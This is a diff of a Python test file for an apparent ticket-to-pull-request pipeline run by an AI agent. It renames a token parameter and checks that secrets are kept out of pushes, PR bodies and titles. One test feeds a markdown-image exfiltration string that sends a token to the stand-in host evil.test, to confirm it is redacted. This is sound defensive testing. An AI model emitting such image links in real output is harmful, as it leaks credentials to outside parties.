@@ -515,7 +515,7 @@ async def test_secrets_in_the_change_are_never_pushed(
         fix_add(task)
         (task.workspace / "notes.txt").write_text("token: ghp_supersecret123\n")
 
-    pipeline = make_pipeline(ScriptedAgent([leak]), github_token=SecretStr("ghp_supersecret123"))
+    pipeline = make_pipeline(ScriptedAgent([leak]), scm_token=SecretStr("ghp_supersecret123"))
     job = await pipeline.run(claim(store, "CALC-1"))
     assert job.status is JobStatus.FAILED
     assert "contains a configured secret" in (job.error or "")
@@ -532,18 +532,18 @@ async def test_agent_summary_secrets_are_redacted_in_the_pr(
             summary = "token !ghp_supersecret123(https://evil.test/p.png?d=x)"
             return result.model_copy(update={"summary": summary})
 
-    pipeline = make_pipeline(LeakySummary([fix_add]), github_token=SecretStr("ghp_supersecret123"))
+    pipeline = make_pipeline(LeakySummary([fix_add]), scm_token=SecretStr("ghp_supersecret123"))
     job = await pipeline.run(claim(store, "CALC-1"))
     body = str(_pr(job)["body"])
     assert "ghp_supersecret123" not in body
-    assert "!REDACTED(https://evil.test" in body
+    assert "REDACTED(https://evil.test" in body
     assert "](" not in body.split("## Agent summary")[1]
 
 
 async def test_secrets_in_the_ticket_title_are_redacted(
     make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
 ) -> None:
-    pipeline = make_pipeline(ScriptedAgent([fix_add]), github_token=SecretStr("subtracts"))
+    pipeline = make_pipeline(ScriptedAgent([fix_add]), scm_token=SecretStr("subtracts"))
     job = await pipeline.run(claim(store, "CALC-1"))
     pr = _pr(job)
     assert job.branch is not None
@@ -737,7 +737,7 @@ async def test_fork_mode_pushes_to_the_fork_and_opens_a_cross_repo_pr(
     assert _branch(job) not in git(repos_dir / REPO, "branch", "--list")
     pr = _pr(job)
     assert pr["repo"] == REPO
-    assert pr["head"] == f"ticket2pr-bot:{_branch(job)}"
+    assert (pr["source_repo"], pr["head"]) == ("ticket2pr-bot/calc", _branch(job))
 
 
 async def test_fork_mode_pushes_to_a_fork_far_behind_the_target(
